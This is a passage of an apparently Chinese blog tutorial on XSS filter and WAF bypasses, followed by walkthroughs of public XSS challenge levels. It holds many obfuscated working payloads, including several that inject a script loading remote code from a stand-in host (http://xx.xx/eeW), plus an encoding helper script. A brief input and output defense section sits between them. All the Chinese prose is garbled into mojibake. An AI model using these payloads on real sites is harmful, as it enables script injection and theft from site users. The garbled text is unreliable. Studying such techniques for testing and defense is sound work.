class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥åˆ©ç”¨@importç›´æ¥æ‰§è¡ŒJavaScriptä»£ç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    @<span class="keyword">import</span> <span class="string">'javascript:alert("xss")'</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;åœ¨ç°å®ç¯å¢ƒä¸‹ï¼ŒHTMLé¡µé¢ä¸­çš„CSSä¸Javascriptçš„åµŒå…¥æ–¹å¼å¾ˆç›¸ä¼¼ï¼Œä¸”CSSä¹Ÿå¯ä»¥æ‰§è¡ŒJavaScriptä»£ç ï¼Œæ•…æˆ‘ä»¬çš„XSSä»£ç ä¹Ÿå¯ä»¥é€šè¿‡åµŒå…¥è¿œç¨‹æ¶æ„CSSæ–‡ä»¶æ¥è¿›è¡ŒXSSæ”»å‡»ã€‚</p><h4 id="æ‰°ä¹±è§„åˆ™"><a href="#æ‰°ä¹±è§„åˆ™" class="headerlink" title="æ‰°ä¹±è§„åˆ™"></a>æ‰°ä¹±è§„åˆ™</h4><p>Â· å¤§å°å†™å˜æ¢;<br>Â· åˆ©ç”¨<code>expression</code>æ‰§è¡Œè·¨ç«™ä»£ç çš„æ—¶å€™ï¼Œå¯ä»¥æ„é€ ä¸åŒçš„å…¨è§’å­—ç¬¦æ¥æ‰°ä¹±è¿‡æ»¤è§„åˆ™;<br>Â· ç»“åˆæ ·å¼è¡¨æ³¨é‡Šå­—ç¬¦<code>/**/</code>ï¼Œé€šè¿‡CSSæ‰§è¡ŒJavaScript<br>Â· æ ·å¼æ ‡ç­¾ä¼šè¿‡æ»¤\å’Œ\0ï¼Œå¯ä»¥æ„é€ å¦‚<code>@i\mp\0\0ort &#39;jav\0asc\0rip\t:al\0er\t(&quot;x\0ss&quot;)&#39;</code>ç»•è¿‡<br>Â· CSSå…³é”®å­—è¿›è¡Œç¼–ç å¤„ç†ï¼Œå¦‚<code>&lt;p style=&quot;xss:\0065xpression(alert(/xss/))&quot;&gt;</code>å…¶ä¸­65ä¸ºå­—æ¯eè¿›è¡Œunicodeç¼–ç åçš„æ•°å­—éƒ¨åˆ†<br>Â· åˆ©ç”¨æµè§ˆå™¨è§£ææ³¨é‡Šçš„é—®é¢˜</p><h4 id="åˆ©ç”¨å­—ç¬¦ç¼–ç "><a href="#åˆ©ç”¨å­—ç¬¦ç¼–ç " class="headerlink" title="åˆ©ç”¨å­—ç¬¦ç¼–ç "></a>åˆ©ç”¨å­—ç¬¦ç¼–ç </h4><p>JavaScriptæ”¯æŒè®¸å¤šçš„ç¼–ç æ ¼å¼ï¼Œå¦‚ï¼šunicodeã€escapesã€åå…­|å|å…«è¿›åˆ¶</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JS8ç¼–ç ï¼š</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>'<span class="attr">al</span>\<span class="attr">145rt</span>'](<span class="attr">1</span>) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>'\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>'](<span class="attr">1</span>) &gt;</span></span><br><span class="line">JS16ç¼–ç ï¼š</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>'<span class="attr">al</span>\<span class="attr">x65rt</span>'](<span class="attr">1</span>) &gt;</span></span><br><span class="line">å…¶ä»–</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[/al/.source%2B/ert/.source](1)</span> &gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªpythonå†™çš„ç¼–ç å°è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote,unquote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexlify</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        tmp+=<span class="string">'\\x'</span>+hex(ord(i))[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">html</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        tmp += <span class="string">'&amp;#'</span> + str(ord(i))+<span class="string">';'</span></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">octlify</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        tmp += <span class="string">'\\'</span> + oct(ord(i))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tx</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(int(s,<span class="number">36</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uu</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        tmp += <span class="string">'\\u'</span> + hex(ord(i))[<span class="number">2</span>:].rjust(<span class="number">4</span>,<span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="comment">#s = (input("input the words you want exchange(only letters and numbers):\n"))</span></span><br><span class="line">s=<span class="string">'alert'</span></span><br><span class="line">print(<span class="string">"å…«è¿›åˆ¶ï¼š"</span>+octlify(s))</span><br><span class="line">print(<span class="string">"åå…­è¿›åˆ¶ï¼š"</span>+hexlify(s))</span><br><span class="line">print(<span class="string">"å®ä½“ç¼–ç ï¼š"</span>+html(s))</span><br><span class="line">print(<span class="string">"36ä¸ºåŸºæ•°ï¼š"</span>+tx(s)+<span class="string">"..toSting(36)"</span>)</span><br><span class="line">print(<span class="string">"\\uå½¢å¼ï¼š"</span>+uu(s))</span><br></pre></td></tr></table></figure><p>ç¼–ç  alertï¼Œè¾“å‡º</p><p><img src="https://i.loli.net/2020/07/16/DiO97rynzSbjAsh.png" alt="image-20200716105441101"></p><p>æ‹†åˆ†ä¸ç¼–ç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">\u0073etInterval(appendChild(createElement(</span>'<span class="attr">script</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">\u0073etInterval(appendChild(createElement(</span>'<span class="attr">sc</span>\<span class="attr">162ipt</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">\u0073etInterval(appendChild(createElement(</span>'<span class="attr">scr</span>'%<span class="attr">2b</span>'<span class="attr">ipt</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">\u0073etInterval(\u0061ppendChild(\u0063reateElement(</span>'<span class="attr">scr</span>'%<span class="attr">2b</span>'<span class="attr">ipt</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)&gt;</span></span><br></pre></td></tr></table></figure><h5 id="parseInt-ä¸toString"><a href="#parseInt-ä¸toString" class="headerlink" title="parseInt()ä¸toString()"></a>parseInt()ä¸toString()</h5><p><img src="https://i.loli.net/2020/07/16/EhY5Mt3XBTJRLNf.png" alt="img"></p><p><img src="https://i.loli.net/2020/07/16/Tsb15exS7Pf8hqw.png" alt="img"></p><p>å¯ä»¥ç”¨parseIntå°†alertä»¥åŸºæ•°ä¸º30è½¬åŒ–ä¸ºæ•°å­— 8680439</p><p><img src="https://i.loli.net/2020/07/16/gsYhiLOabGMfDWv.png" alt="img"></p><p>ç”¨toString()å‡½æ•°å°† 8680439 ä»¥30ä¸ºåŸºæ•°è½¬æˆå­—ç¬¦ä¸²alert</p><p><img src="https://i.loli.net/2020/07/16/bsQ5NxeCfGK8nDz.png" alt="img"></p><p>å†ç»“åˆonäº‹ä»¶å’ŒTopå±æ€§ payloadï¼š<code>ontoggle=top[8680439..toString(30)](&#39;xss&#39;);</code></p><p>å’ŒTopå±æ€§ç±»ä¼¼çš„è¿˜æœ‰<code>selfã€parentã€framesã€contentã€window</code>ï¼Œä½†topæ˜¯æœ€çŸ­çš„äº†ã€‚</p><p>ã€ä»¥30ä¸ºåŸºæ•°çš„æ—¶å€™æœ‰ä¸€äº›å­—æ¯ä¸èƒ½è¡¨ç¤ºï¼Œæ‰€ä»¥å»ºè®®ä»¥36ä¸ºåŸºæ•°ã€‘</p><h4 id="å…¶å®ƒæŠ€å·§"><a href="#å…¶å®ƒæŠ€å·§" class="headerlink" title="å…¶å®ƒæŠ€å·§"></a>å…¶å®ƒæŠ€å·§</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">alt</span>=<span class="string">al</span> <span class="attr">lang</span>=<span class="string">ert</span> <span class="attr">onerror</span>=<span class="string">top[alt%2blang](0)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¾‹å­å¾ˆå·§å¦™ï¼Œå°†altå’Œlangå±æ€§åˆ†åˆ«èµ‹å€¼åˆå¹¶èµ·æ¥å°±æ˜¯alertï¼Œå¹¶åœ¨topå±æ€§å†…å°†2ä¸ªå±æ€§ç›¸åŠ ã€‚</p><p>é™¤äº†æ‹¼alertï¼Œæ‹¼evalç”¨å¤„æ›´å¤§äº›ï¼Œæœ‰äº†evalï¼Œåé¢çš„ä¸œè¥¿è½¬ç ä»€ä¹ˆçš„ä¹Ÿå¾ˆæ–¹ä¾¿</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[a</span>=<span class="string">'al'</span>,<span class="attr">b</span>=<span class="string">'ev'</span>,<span class="attr">b</span>%<span class="attr">2ba</span>](<span class="attr">atob</span>('<span class="attr">YWxlcnQoMSk</span>=<span class="string">'))&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;details open ontoggle=top[a='</span><span class="attr">al</span>',<span class="attr">b</span>=<span class="string">'ev'</span>,<span class="attr">b</span>%<span class="attr">2ba</span>]('\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>\<span class="attr">50</span>\<span class="attr">61</span>\<span class="attr">51</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[a</span>=<span class="string">'al'</span>,<span class="attr">b</span>=<span class="string">'ev'</span>,<span class="attr">b</span>%<span class="attr">2ba</span>]('\<span class="attr">u0061</span>\<span class="attr">u006c</span>\<span class="attr">u0065</span>\<span class="attr">u0072</span>\<span class="attr">u0074</span>\<span class="attr">u0028</span>\<span class="attr">u0031</span>\<span class="attr">u0029</span>')&gt;</span></span><br></pre></td></tr></table></figure><p>setTimeout()å‡½æ•°ä¹Ÿæ˜¯æ²¡é—®é¢˜çš„ï¼Œæ¯•ç«Ÿä¹Ÿèƒ½æ‰§è¡Œä»£ç ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[a</span>=<span class="string">'meout'</span>,<span class="attr">b</span>=<span class="string">'setTi'</span>,<span class="attr">b</span>%<span class="attr">2ba</span>]('\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>\<span class="attr">50</span>\<span class="attr">61</span>\<span class="attr">51</span>')&gt;</span></span><br></pre></td></tr></table></figure><h5 id="setTimeout-amp-setInterval"><a href="#setTimeout-amp-setInterval" class="headerlink" title="setTimeout&amp;setInterval"></a>setTimeout&amp;setInterval</h5><p>setTimeoutåœ¨å»¶æ—¶ä¸€å®šæ—¶é—´åæ‰§è¡Œcodeä¸€æ¬¡</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">setTimeout</span>`<span class="attr">alert</span>\<span class="attr">u0028233</span>\<span class="attr">u0029</span>`&gt;</span></span><br></pre></td></tr></table></figure><p>setIntervalä»¥ä¸€å®šæ—¶é—´ä¸ºå‘¨æœŸæ‰§è¡Œcode</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">setInterval(</span>'<span class="attr">al</span>'%<span class="attr">2b</span>'<span class="attr">ert</span>(<span class="attr">1</span>)')&gt;</span></span><br></pre></td></tr></table></figure><p>ç»•è¿‡wafï¼Œå¼•ç”¨å¤–éƒ¨js</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">setInterval(appendChild(createElement(</span>'<span class="attr">script</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)&gt;</span></span><br></pre></td></tr></table></figure><h5 id="ç»“åˆå‡½æ•°ï¼š"><a href="#ç»“åˆå‡½æ•°ï¼š" class="headerlink" title="ç»“åˆå‡½æ•°ï¼š"></a>ç»“åˆå‡½æ•°ï¼š</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">s</span>=<span class="string">createElement(</span>'<span class="attr">script</span>');<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">[</span>'<span class="attr">http</span>','<span class="attr">:</span>//','<span class="attr">xx.xx</span>','/<span class="attr">eeW</span>']<span class="attr">.join</span>('') &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">s</span>=<span class="string">createElement(</span>'<span class="attr">script</span>');<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">[</span>'<span class="attr">http</span>']%<span class="attr">2B</span>['<span class="attr">:</span>//']%<span class="attr">2B</span>['<span class="attr">xx.xx</span>']%<span class="attr">2B</span>['/<span class="attr">eeW</span>']<span class="attr">.join</span>('') &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">s</span>=<span class="string">\u0063reateElement(</span>'<span class="attr">scr</span>'%<span class="attr">2b</span>'<span class="attr">ipt</span>');\<span class="attr">u0062ody.</span>\<span class="attr">u0061ppendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">'http://x'</span><span class="attr">.concat</span>('<span class="attr">x.xx</span>/','<span class="attr">eeW</span>'); &gt;</span></span><br></pre></td></tr></table></figure><h5 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h5><p><img src="https://i.loli.net/2020/07/16/b9NoRXeqlHyzJFk.png" alt="img"></p><p><img src="https://i.loli.net/2020/07/16/4uhGq7WyTeVNHOd.png" alt="image-20200716090526633"></p><p><img src="https://i.loli.net/2020/07/16/XLGUWbyp64kH7Ft.png" alt="image-20200716090613857"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">Set.constructor(</span>'<span class="attr">al</span>'%<span class="attr">2b</span>'<span class="attr">ert</span>(<span class="attr">1</span>)')()&gt;</span></span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">Set.constructor(appendChild(createElement(</span>'<span class="attr">script</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)()&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">Set.constructor</span>`<span class="attr">al</span>\<span class="attr">x65rt</span>\<span class="attr">x28</span>/<span class="attr">xss</span>/\<span class="attr">x29</span>```&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">Map.constructor</span>`<span class="attr">al</span>\<span class="attr">x65rt</span>\<span class="attr">x28</span>/<span class="attr">xss</span>/\<span class="attr">x29</span>```&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">clear.constructor</span>`<span class="attr">al</span>\<span class="attr">x65rt</span>\<span class="attr">x28</span>/<span class="attr">xss</span>/\<span class="attr">x29</span>```&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">Array.constructor</span>`<span class="attr">al</span>\<span class="attr">x65rt</span>\<span class="attr">x28</span>/<span class="attr">xss</span>/\<span class="attr">x29</span>```&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">WeakSet.constructor</span>`<span class="attr">al</span>\<span class="attr">x65rt</span>\<span class="attr">x28</span>/<span class="attr">xss</span>/\<span class="attr">x29</span>```&gt;</span></span><br><span class="line">    //åé¢ä¸¤ä¸ª``ç›¸å½“äº()ï¼Œæ˜¯å¯¹å‡½æ•°çš„å¼•ç”¨ï¼Œæ˜¯å¦å¯ä»¥ç”¨æ¥ç»•è¿‡é‚£äº›è¿‡æ»¤æ‹¬å·çš„wafå‘¢ï¼Ÿ</span><br></pre></td></tr></table></figure><h4 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h4><h5 id="è¾“å…¥"><a href="#è¾“å…¥" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>â€‹       ä¸¥æ ¼æ§åˆ¶ç”¨æˆ·å¯è¾“å…¥çš„èŒƒå›´ï¼Œå¦‚æ‰‹æœºå·åªèƒ½è¾“å…¥æ•°å­—ä¸”é•¿åº¦ä¸èƒ½å¤§äº11ä½ç­‰ï¼Œå¦‚éœ€è¾“å…¥æŸäº›æ•æ„Ÿå­—ç¬¦çš„æƒ…å†µä¸‹å¯å¯¹æ•°æ®è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œå¯¹äºç”¨æˆ·æ•°æ®çš„è¿‡æ»¤å°½å¯èƒ½åœ°é‡‡ç”¨ç™½åå•è€Œä¸æ˜¯é»‘åå•ã€‚</p><h5 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>â€‹       å‡å°‘ä¸å¿…è¦çš„è¾“å‡ºï¼Œåœ¨éœ€è¦è¾“å‡ºçš„åœ°æ–¹ä½¿ç”¨HTMLç¼–ç å°†æ•æ„Ÿå­—ç¬¦è½¬ä¹‰ä¸ºå®ä½“ç¬¦ï¼ŒJavaScriptè¿›è¡ŒDOMæ“ä½œæ—¶æ³¨æ„ä¸è¦å°†å·²è½¬ä¹‰çš„å®ä½“ç¬¦å†æ¬¡è§£ææˆDOMå¯¹è±¡ã€‚</p><h5 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h5><p>â€‹       è®¾ç½®HttpOnlyï¼Œå¼€å¯WAFã€‚</p><h3 id="ä¸€äº›BATçš„XSSå®ä¾‹ï¼ˆä¿®æ”¹è€Œæ¥çš„XSSé¢˜ç›®ï¼‰"><a href="#ä¸€äº›BATçš„XSSå®ä¾‹ï¼ˆä¿®æ”¹è€Œæ¥çš„XSSé¢˜ç›®ï¼‰" class="headerlink" title="ä¸€äº›BATçš„XSSå®ä¾‹ï¼ˆä¿®æ”¹è€Œæ¥çš„XSSé¢˜ç›®ï¼‰"></a>ä¸€äº›BATçš„XSSå®ä¾‹ï¼ˆä¿®æ”¹è€Œæ¥çš„XSSé¢˜ç›®ï¼‰</h3><h4 id="ç¬¬ä¸€å…³"><a href="#ç¬¬ä¸€å…³" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h4><p><a href="http://px1624.sinaapp.com/test/xsstest1/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest1/</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> x=location.hash;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">aa</span><span class="params">(x)</span></span>&#123;&#125;;</span></span><br><span class="line"><span class="actionscript">setTimeout(<span class="string">"aa('"</span>+x+<span class="string">"')"</span>,<span class="number">100</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Give me xss bypass 1~</span><br></pre></td></tr></table></figure><p>è¿™åº”è¯¥æ˜¯ä¸€ä¸ªDOM XSSï¼Œæˆ‘ä»¬åªéœ€è¦å¯¹å‰é¢çš„æ‹¬å·è¿›è¡Œé—­åˆå³å¯å¼¹çª—</p><p>payload:<code>http://px1624.sinaapp.com/test/xsstest1/#&#39;);alert(&#39;123</code></p><h4 id="ç¬¬äºŒå…³"><a href="#ç¬¬äºŒå…³" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h4><p><a href="http://px1624.sinaapp.com/test/xsstest2/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest2/</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Give me xss bypass 2~</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'display:none'</span> <span class="attr">id</span>=<span class="string">'xx'</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'button'</span> <span class="attr">value</span>=<span class="string">'test'</span> <span class="attr">onclick</span>=<span class="string">'alert("å“ˆå“ˆï¼Œç‚¹è¿™ç©æ„æ²¡å•¥ç”¨çš„ï¼")'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> query = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span></span><br><span class="line"><span class="actionscript">   <span class="keyword">var</span> vars = query.split(<span class="string">"&amp;"</span>);</span></span><br><span class="line"><span class="actionscript">   <span class="keyword">if</span>(vars)&#123;</span></span><br><span class="line">aa(vars[0],vars[1])</span><br><span class="line">   &#125;</span><br><span class="line"><span class="actionscript">   <span class="function"><span class="keyword">function</span> <span class="title">aa</span><span class="params">(x,y)</span></span>&#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">"#xx"</span>)[x]($(<span class="string">"#xx"</span>)[y]());</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¦–å…ˆå®ƒè·å–äº†æˆ‘ä»¬è¯·æ±‚çš„å‚æ•°ï¼Œç”¨&amp;åˆ†å‰²è·å–å˜é‡ï¼Œç„¶åå°†è¿™ä¸¤ä¸ªå˜é‡ä¼ åˆ°å‡½æ•°aaä¸­æ‰§è¡Œï¼Œå‡½æ•°aaå¯¹idä¸ºxxçš„æ ‡ç­¾è¿›è¡Œäº†ä¸¤æ¬¡domæ“ä½œ</p><p>è¿™é‡Œï¼Œ<code>$(&quot;#xx&quot;)[&#39;text&#39;]()</code>çš„ç»“æœä¼šæ˜¯<code>&quot;&lt;img src=x onerror=alert(1)&gt;&quot;</code></p><p>æ‰€ä»¥è¿™é‡Œçš„payload:<code>http://px1624.sinaapp.com/test/xsstest2/?append&amp;text</code></p><p>äºæ˜¯xxæ ‡ç­¾å°±ä¼šåŠ ä¸Šä¸€ä¸ªxxçš„textå½¢å¼</p><p><img src="https://i.loli.net/2020/07/16/Mqo1veOpmRtzNa2.png" alt="image-20200714164426445"></p><p>ä»è€Œè§¦å‘å¼¹çª—ã€‚</p><h4 id="ç¬¬ä¸‰å…³"><a href="#ç¬¬ä¸‰å…³" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h4><p><a href="http://px1624.sinaapp.com/test/xsstest3/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest3/</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 3~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) 